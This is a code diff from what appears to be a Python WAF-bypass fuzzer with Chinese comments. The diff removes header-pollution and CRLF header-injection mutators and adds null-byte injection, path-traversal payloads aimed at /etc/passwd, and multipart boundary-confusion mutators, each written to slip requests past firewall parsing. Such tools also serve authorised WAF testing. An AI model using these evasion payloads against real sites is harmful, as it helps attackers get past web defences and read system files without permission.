@@ -1590,57 +1590,82 @@ def get_weighted_mutant_methods(mutant_methods_config):
 
     return mutant_methods
 
-def mutant_methods_header_pollution(headers, url, method, data, files):
+def mutant_methods_null_byte_injection(headers, url, method, data, files):
     """
-    向请求头中注入重复或冲突的头部字段，尝试引发服务器和WAF解析不一致
+    在 URL 和参数中插入 %00（null byte）以尝试绕过解析逻辑
     """
-    logger.info(TAG + "==>mutant_methods_header_pollution")
-    logger.debug(TAG + "==>headers: " + str(headers))
+    logger.info(TAG + "==>mutant_methods_null_byte_injection")
     mutant_payloads = []
 
-    # 复制原始headers，避免直接修改
-    polluted_headers = copy.deepcopy(headers)
+    parsed_url = urllib.parse.urlparse(url)
+    null_byte_query = parsed_url.query.replace("=", "%00=")
+    mutated_url = urllib.parse.urlunparse(parsed_url._replace(query=null_byte_query))
 
-    # 添加重复的 Content-Length 或 Transfer-Encoding
-    pollution_variants = [
-        ("Content-Length", "0"),  # 重复Content-Length
-        ("Transfer-Encoding", "chunked"),  # 添加Transfer-Encoding
-        ("X-Ignore-This", "ignore"),  # 添加无用header
-        ("Content-Length", "9999"),  # 不同值的重复
-    ]
+    mutated_data = data
+    if isinstance(data, str):
+        mutated_data = data.replace("=", "%00=")
 
-    # 注入多组冲突header
-    for header_name, header_value in pollution_variants:
-        modified_headers = copy.deepcopy(polluted_headers)
-        modified_headers[header_name] = header_value
+    mutant_payloads.append({
+        'headers': headers,
+        'url': mutated_url,
+        'method': method,
+        'data': mutated_data,
+        'files': files
+    })
+    return mutant_payloads
+
+def mutant_methods_path_traversal(headers, url, method, data, files):
+    """
+    对 URL 的 path 注入路径穿越 payload
+    """
+    logger.info(TAG + "==>mutant_methods_path_traversal")
+    mutant_payloads = []
+
+    parsed_url = urllib.parse.urlparse(url)
+    traversal_payloads = ['../../../../etc/passwd', '..%2f..%2fetc%2fpasswd']
+    
+    for payload in traversal_payloads:
+        new_path = f"{parsed_url.path}/{payload}"
+        mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=new_path))
         mutant_payloads.append({
-            'headers': modified_headers,
-            'url': url,
+            'headers': headers,
+            'url': mutated_url,
             'method': method,
             'data': data,
+            'files': files
+        })
+    return mutant_payloads
+
+def mutant_methods_random_boundary_confusion(headers, url, method, data, files):
+    """
+    为 multipart/form-data 设置异常的 boundary 值来尝试绕过解析逻辑
+    """
+    logger.info(TAG + "==>mutant_methods_random_boundary_confusion")
+    mutant_payloads = []
+
+    if 'multipart/form-data' in headers.get('Content-Type', ''):
+        mutated_headers = copy.deepcopy(headers)
+        random_boundary = 'AaB03x' + ''.join(random.choices("abcdef0123456789", k=8))
+        mutated_headers['Content-Type'] = f'multipart/form-data; boundary="{random_boundary}"'
+
+        if isinstance(data, bytes):
+            data = data.decode()
+
+        if isinstance(data, str):
+            mutated_data = data.replace('--' + random_boundary, '--' + random_boundary.upper())
+        else:
+            mutated_data = data
+
+        mutant_payloads.append({
+            'headers': mutated_headers,
+            'url': url,
+            'method': method,
+            'data': mutated_data,
             'files': files
         })
 
     return mutant_payloads
 
-def mutant_methods_header_injection(headers, url, method, data, files):
-    """
-    通过在 header 中注入额外的伪造 header 行来混淆 WAF 检测
-    """
-    logger.info(TAG + "==>mutant_methods_header_injection")
-    mutant_payloads = []
-
-    injected_headers = copy.deepcopy(headers)
-    injected_headers["X-Injected-Header"] = "InjectedValue\r\nContent-Length: 0\r\nX-Evil: yes"
-
-    mutant_payloads.append({
-        'headers': injected_headers,
-        'url': url,
-        'method': method,
-        'data': data,
-        'files': files
-    })
-    return mutant_payloads
 
 '''
 ALL MUTANT METHODS:
